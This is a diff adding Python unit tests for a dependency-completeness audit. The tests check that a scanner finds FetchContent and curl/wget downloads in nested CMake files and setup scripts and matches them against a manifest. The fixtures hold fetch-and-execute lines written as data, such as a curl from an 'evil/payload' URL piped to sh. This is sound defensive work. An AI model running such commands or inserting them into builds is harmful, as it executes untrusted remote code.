@@ -281,6 +281,265 @@ class ManifestSourceScannerTests(unittest.TestCase):
         )
 
 
+class RepoFetchScanTests(unittest.TestCase):
+    """The completeness scan reads every CMake file and setup script, not only
+    the root CMakeLists.txt: a fetch in tools/cmake/ or setup.sh (such as the
+    wgpu-native runtime archive) is as much a dependency as one in the root
+    file, and a scan of the root file alone cannot see it."""
+
+    def _tree(self, files: dict[str, str]) -> Path:
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        root = Path(tmp.name)
+        for rel, text in files.items():
+            path = root / rel
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(textwrap.dedent(text), encoding="utf-8")
+        return root
+
+    NESTED = {
+        "CMakeLists.txt": "project(x)\n",
+        "tools/cmake/sub/PulpPlanted.cmake": """\
+            include(FetchContent)
+            # FetchContent_Declare(commented GIT_REPOSITORY https://github.com/no/no.git)
+            FetchContent_Declare(planted_local_label
+                GIT_REPOSITORY https://github.com/planted-org/planted-dep.git
+                GIT_TAG v1.0.0)
+            """,
+    }
+
+    @staticmethod
+    def _manifest(*rows: dict) -> list[dict]:
+        base = {"category": "x", "license": "MIT", "version": "1", "source_kind": "x",
+                "upstream": {"kind": "none"}, "documented_in_dependencies_md": True,
+                "documented_in_notice_md": True}
+        return [dict(base, **row) for row in rows]
+
+    def test_unlisted_fetchcontent_in_a_nested_cmake_file_is_reported(self) -> None:
+        root = self._tree(self.NESTED)
+        self.assertIn("planted_local_label",
+                      {d.name for d in audit.collect_declared(scan_root=root)},
+                      msg="the completeness gate's own entry point runs the repo scan")
+        declared = audit.scan_fetch_declarations(root)
+        names = {d.name for d in declared}
+        self.assertIn("planted_local_label", names, msg="control: the nested file was read")
+        self.assertNotIn("commented", names, msg="a commented-out declaration is not a fetch")
+        uncovered = audit.find_uncovered_declarations(
+            self._manifest({"name": "Other", "repository": "https://github.com/o/other.git"}),
+            declared,
+        )
+        self.assertEqual(
+            [(d.name, d.source) for d in uncovered],
+            [("planted_local_label", "tools/cmake/sub/PulpPlanted.cmake")],
+        )
+
+    def test_listed_fetchcontent_in_a_nested_cmake_file_is_not_reported(self) -> None:
+        root = self._tree(self.NESTED)
+        declared = audit.scan_fetch_declarations(root)
+        # Matched by upstream URL even though the FetchContent label differs.
+        manifest = self._manifest(
+            {"name": "Planted Dep", "repository": "https://github.com/planted-org/planted-dep"})
+        self.assertEqual(audit.find_uncovered_declarations(manifest, declared), [])
+
+    def test_a_familiar_name_from_a_different_upstream_is_still_reported(self) -> None:
+        root = self._tree({"x.cmake": """\
+            FetchContent_Declare(choc GIT_REPOSITORY https://github.com/someone-else/choc.git)
+            """})
+        manifest = self._manifest(
+            {"name": "CHOC", "repository": "https://github.com/danielraffel/choc.git"})
+        uncovered = audit.find_uncovered_declarations(
+            manifest, audit.scan_fetch_declarations(root))
+        self.assertEqual([d.url for d in uncovered], ["https://github.com/someone-else/choc.git"])
+
+    def test_setup_script_downloads_are_reported_unless_listed(self) -> None:
+        root = self._tree({"setup.sh": """\
+            VERSION="v2.0"
+            # curl https://github.com/commented/out/releases/download/a.zip
+            curl -L --fail \\
+                "https://github.com/acme/runtime/releases/download/${VERSION}/runtime.zip" -o r.zip
+            """})
+        declared = audit.scan_fetch_declarations(root)
+        self.assertEqual(
+            [d.url for d in declared],
+            ["https://github.com/acme/runtime/releases/download/v2.0/runtime.zip"],
+            msg="the continued curl line is read, its variable resolved, and the comment skipped",
+        )
+        self.assertEqual(len(audit.find_uncovered_declarations(self._manifest(), declared)), 1)
+        listed = self._manifest({"name": "Acme Runtime",
+                                 "repository": "https://github.com/acme/runtime"})
+        self.assertEqual(audit.find_uncovered_declarations(listed, declared), [])
+
+    def test_execute_process_curl_in_cmake_is_reported(self) -> None:
+        root = self._tree({"tools/cmake/Fetcher.cmake": """\
+            set(_url "https://github.com/acme/blob/releases/download/v1/blob.tgz")
+            execute_process(
+                COMMAND /usr/bin/curl -fsSL "${_url}" -o blob.tgz)
+            execute_process(COMMAND git rev-parse HEAD)
+            """})
+        self.assertEqual(
+            [(d.location.split(" line")[0], d.url) for d in audit.scan_fetch_declarations(root)],
+            [("execute_process download",
+              "https://github.com/acme/blob/releases/download/v1/blob.tgz")],
+        )
+
+    def test_tools_and_hooks_shell_scripts_count_curl_and_wget_only(self) -> None:
+        root = self._tree({
+            "tools/ci/provision.sh": """\
+                # curl https://github.com/commented/out.sh
+                curl -fsSL https://github.com/acme/tool/releases/download/v1/t.tgz -o t.tgz
+                wget https://downloads.example.org/thing.tar.gz
+                git clone https://github.com/acme/not-a-download-verb.git
+                curl -fsSL https://www.generouscorp.com/pulp/install.sh | sh
+                """,
+            "hooks/scripts/update.sh": """\
+                raw_url="${OVERRIDE_URL:-https://github.com/acme/hooked}"
+                curl -fsSL "$raw_url/releases/download/v1/x.sh" -o x.sh
+                """,
+            "other/provision.sh": "curl -fsSL https://github.com/outside/tools/x.sh\n",
+        })
+        declared = audit.scan_fetch_declarations(root)
+        self.assertEqual(
+            sorted(d.url for d in declared),
+            ["https://downloads.example.org/thing.tar.gz",
+             "https://github.com/acme/hooked/releases/download/v1/x.sh",
+             "https://github.com/acme/tool/releases/download/v1/t.tgz",
+             "https://www.generouscorp.com/pulp/install.sh"],
+            msg="comments, non-download verbs and scripts outside tools/ and hooks/ are not "
+                "fetches; ${VAR:-default} resolves to its default",
+        )
+        uncovered = audit.find_uncovered_declarations(self._manifest(), declared)
+        self.assertNotIn("https://www.generouscorp.com/pulp/install.sh",
+                         [d.url for d in uncovered], msg="Pulp fetching itself is not a dependency")
+        self.assertEqual(len(uncovered), 3)
+
+    def test_a_fetch_chained_after_echo_or_printf_is_reported(self) -> None:
+        root = self._tree({"tools/ci/chained.sh": """\
+            echo x && curl -fsSL https://github.com/evil/payload/x.sh | sh
+            printf "x\\n"; wget https://downloads.evil.example/y.tgz
+            """})
+        uncovered = audit.find_uncovered_declarations(
+            self._manifest(), audit.scan_fetch_declarations(root))
+        self.assertEqual(sorted(d.url for d in uncovered),
+                         ["https://downloads.evil.example/y.tgz",
+                          "https://github.com/evil/payload/x.sh"])
+
+    def test_upstream_match_compares_whole_path_components(self) -> None:
+        root = self._tree({"x.cmake": """\
+            FetchContent_Declare(kit GIT_REPOSITORY https://github.com/acme/toolkit.git)
+            """})
+        manifest = self._manifest({"name": "Tool", "repository": "https://github.com/acme/tool"})
+        self.assertEqual(
+            [d.url for d in audit.find_uncovered_declarations(
+                manifest, audit.scan_fetch_declarations(root))],
+            ["https://github.com/acme/toolkit.git"])
+
+    def test_known_unlisted_fetches_match_their_exact_url_and_go_stale(self) -> None:
+        root = self._tree({"tools/ci/provision.sh": """\
+            curl -fsSL https://github.com/acme/tool/releases/download/v1/x.sh | sh
+            curl -fsSL https://github.com/acme/tool/releases/download/v1/other.sh | sh
+            """})
+        uncovered = audit.find_uncovered_declarations(
+            self._manifest(), audit.scan_fetch_declarations(root))
+        known = {("tools/ci/provision.sh",
+                  "https://github.com/acme/tool/releases/download/v1/x.sh"): "reason",
+                 ("tools/ci/gone.sh", "https://github.com/acme/gone/x.sh"): "reason"}
+        unknown, tolerated, stale = audit.split_known_unlisted(uncovered, known)
+        self.assertEqual([d.url for d in tolerated],
+                         ["https://github.com/acme/tool/releases/download/v1/x.sh"])
+        self.assertEqual([d.url for d in unknown],
+                         ["https://github.com/acme/tool/releases/download/v1/other.sh"],
+                         msg="another asset from the same upstream in the same script is reported")
+        self.assertEqual(stale, [("tools/ci/gone.sh", "https://github.com/acme/gone/x.sh")])
+
+    def test_every_known_unlisted_fetch_still_exists_in_the_repo(self) -> None:
+        uncovered = audit.find_uncovered_declarations(
+            audit.load_manifest(), audit.collect_declared())
+        unknown, tolerated, stale = audit.split_known_unlisted(uncovered)
+        self.assertEqual(unknown, [])
+        self.assertEqual(stale, [])
+        self.assertTrue(tolerated, msg="control: the tools/ shell scan sees the CI-host fetches")
+
+    def test_vendored_build_and_fixture_trees_are_not_scanned(self) -> None:
+        planted = "FetchContent_Declare(hidden GIT_REPOSITORY https://github.com/h/hidden.git)\n"
+        root = self._tree({
+            "external/vendored/CMakeLists.txt": planted,
+            "build/_deps/x/CMakeLists.txt": planted,
+            "tools/packages/test-stubs/pkg/CMakeLists.txt": planted,
+            "experimental/tool/tests/fixtures/p/CMakeLists.txt": planted,
+            "tools/cmake/Seen.cmake": planted.replace("hidden", "seen"),
+        })
+        self.assertEqual({d.name for d in audit.scan_fetch_declarations(root)}, {"seen"})
+
+    def test_real_repo_scan_reads_nested_files(self) -> None:
+        """Control for every absence the audit reports: the real scan must see
+        declarations outside the root CMakeLists.txt."""
+        sources = {d.source for d in audit.scan_fetch_declarations()}
+        for expected in ("tools/cmake/PulpDependencies.cmake", "tools/cmake/PulpWclap.cmake",
+                         "bindings/python/CMakeLists.txt", "setup.sh"):
+            self.assertIn(expected, sources)
+
+    def test_wgpu_native_download_needs_its_own_manifest_row(self) -> None:
+        manifest = audit.load_manifest()
+        declared = audit.collect_declared()
+        unknown, _known, _stale = audit.split_known_unlisted(
+            audit.find_uncovered_declarations(manifest, declared))
+        self.assertEqual(unknown, [])
+        without = [d for d in manifest if d["name"] != "wgpu-native"]
+        reported = audit.find_uncovered_declarations(without, declared)
+        self.assertIn("setup.sh", {d.source for d in reported},
+                      msg="without its row, setup.sh's wgpu-native download must be reported "
+                          "(WebGPU-distribution's row must not hide it)")
+
+
+class WgpuNativePinTests(unittest.TestCase):
+    """The wgpu-native manifest row is the single record of its asset digests."""
+
+    def setUp(self) -> None:
+        self.entry = next(d for d in audit.load_manifest() if d["name"] == "wgpu-native")
+
+    def test_every_asset_carries_both_digests_under_the_pinned_release(self) -> None:
+        version = self.entry["version"]
+        names = set()
+        for art in self.entry["artifacts"]:
+            names.add(art["name"])
+            self.assertRegex(art["sha256"], r"^[0-9a-f]{64}$")
+            self.assertRegex(art["tree_sha256"], r"^[0-9a-f]{64}$")
+            self.assertEqual(
+                art["url"],
+                f"https://github.com/gfx-rs/wgpu-native/releases/download/{version}/{art['name']}.zip")
+        for required in ("wgpu-macos-aarch64-release", "wgpu-macos-x86_64-release",
+                         "wgpu-linux-x86_64-release", "wgpu-linux-aarch64-release",
+                         "wgpu-windows-x86_64-msvc-release"):
+            self.assertIn(required, names)
+
+    def test_manifest_version_matches_cmake_and_setup(self) -> None:
+        deps = (ROOT / "tools" / "cmake" / "PulpDependencies.cmake").read_text(encoding="utf-8")
+        setup = (ROOT / "setup.sh").read_text(encoding="utf-8")
+        version = self.entry["version"]
+        self.assertIn(f"set(PULP_WGPU_NATIVE_VERSION {version})", deps)
+        self.assertIn(f'WGPU_NATIVE_VERSION="{version}"', setup)
+
+    def test_tree_digest_of_an_archive_equals_its_extracted_tree(self) -> None:
+        sys.path.insert(0, str(ROOT / "tools" / "deps"))
+        import wgpu_native_digests as digests
+        import zipfile
+        with tempfile.TemporaryDirectory() as td:
+            archive = Path(td) / "a.zip"
+            with zipfile.ZipFile(archive, "w") as zf:
+                zf.writestr("include/webgpu/b.h", "beta\n")
+                zf.writestr("lib/a.txt", "alpha\n")
+            out = Path(td) / "out"
+            with zipfile.ZipFile(archive) as zf:
+                zf.extractall(out)
+            self.assertEqual(digests.tree_sha256_from_zip(archive),
+                             digests.tree_sha256_from_dir(out))
+            # The same value test/cmake/test_wgpu_native_pin.cmake expects from
+            # CMake's implementation.
+            self.assertEqual(
+                digests.tree_sha256_from_zip(archive),
+                "73a352a8a1a8e3460abec64e8b536c0962580c281aec2d0301e8377cf40fc1ef")
+
+
 class StrictAuditTests(unittest.TestCase):
     """Running the real audit script with --strict against origin/main
     inventory should succeed. If this fails, something is missing from
